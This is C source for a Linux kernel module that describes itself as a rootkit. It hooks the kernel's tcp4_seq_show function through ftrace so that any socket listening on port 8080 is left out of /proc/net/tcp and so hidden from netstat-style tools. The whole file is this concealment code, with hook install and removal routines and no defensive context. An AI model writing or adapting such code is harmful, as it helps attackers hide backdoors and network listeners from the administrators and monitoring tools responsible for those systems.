#include "hide_proc_net.h"
//#include "ftrace_helper.h"
struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    if (sk != 0x1 && sk->sk_num == 0x1f90)
    {
		printk(KERN_ALERT "rootkit: Found process listening on port 8080 - hiding!\n");
		return 0;
	}
    ret = org_tcp4_seq_show(seq, v);
    return ret;

}
static int __init netstat_hide(void)
{
    int ret;
    ret = install_hook(&tcp4_hook);
    //ret = set_ops("/proc/net/tcp");
    printk(KERN_ALERT "set ops done, ret equals to : %d", ret);

    return 0;
}
static void __exit unhide(void)
{
    fh_remove_hook(&tcp4_hook);
}
MODULE_LICENSE("GPL");
module_init(netstat_hide);
module_exit(unhide);